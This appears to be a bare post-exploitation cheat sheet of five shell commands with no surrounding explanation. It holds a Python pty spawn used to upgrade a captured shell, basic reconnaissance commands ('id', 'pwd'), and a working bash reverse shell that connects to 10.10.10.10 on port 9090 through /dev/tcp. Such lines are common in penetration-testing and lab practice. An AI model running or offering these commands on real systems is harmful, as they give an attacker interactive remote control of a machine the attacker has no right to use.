python -c 'import pty;pty.spawn("/bin/bash")'
bash -l
id
pwd
bash -c 'bash -i >& /dev/tcp/10.10.10.10/9090 0<&1'
